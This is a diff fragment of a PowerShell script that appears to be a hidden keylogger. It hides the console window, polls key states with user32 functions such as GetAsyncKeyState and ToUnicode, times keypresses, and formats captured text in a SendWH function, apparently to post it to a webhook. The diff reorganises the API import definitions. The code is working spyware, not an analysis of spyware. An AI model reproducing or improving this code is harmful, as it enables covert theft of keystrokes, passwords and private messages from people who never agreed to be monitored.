@@ -16,6 +16,18 @@ else{
     $Type::ShowWindowAsync($hwnd, 0)
 }
 
+
+$defs = @'
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
+public static extern short GetAsyncKeyState(int virtualKeyCode); 
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int GetKeyboardState(byte[] keystate);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int MapVirtualKey(uint uCode, int uMapType);
+'@
+
 Function SendWH {
       $Escaped = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
       $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
@@ -34,46 +46,7 @@ Function isKey {
         SaveCharacter = New-Object -TypeName System.Text.StringBuilder  
 }
 
-$defs = @'
-using System;
-using System.Runtime.InteropServices;
-using System.Text;
-
-public class User32 {
-    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
-    public static extern short GetAsyncKeyState(int virtualKeyCode);
-
-    [DllImport("user32.dll", CharSet=CharSet.Auto)]
-    public static extern int GetKeyboardState(byte[] keystate);
-
-    [DllImport("user32.dll", CharSet=CharSet.Auto)]
-    public static extern int MapVirtualKey(uint uCode, int uMapType);
-
-    [DllImport("user32.dll", CharSet=CharSet.Auto)]
-    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, StringBuilder pwszBuff, int cchBuff, uint wFlags);
-
-    [DllImport("user32.dll")]
-    public static extern IntPtr GetForegroundWindow();
-
-    [DllImport("user32.dll", SetLastError = true)]
-    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
-
-    [DllImport("user32.dll", SetLastError = true)]
-    public static extern int GetWindowTextLength(IntPtr hWnd);
-
-    [DllImport("user32.dll", SetLastError = true)]
-    public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto)]
-    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
-    [DllImport("user32.dll")]
-    public static extern bool IsWindowVisible(IntPtr hWnd);
-}
-'@
-
 $defs = Add-Type -MemberDefinition $defs -Name 'Win32' -Namespace API -PassThru
-
 $LastpressTime = [System.Diagnostics.Stopwatch]::StartNew()
 $Threshold = [TimeSpan]::FromSeconds(10)
 
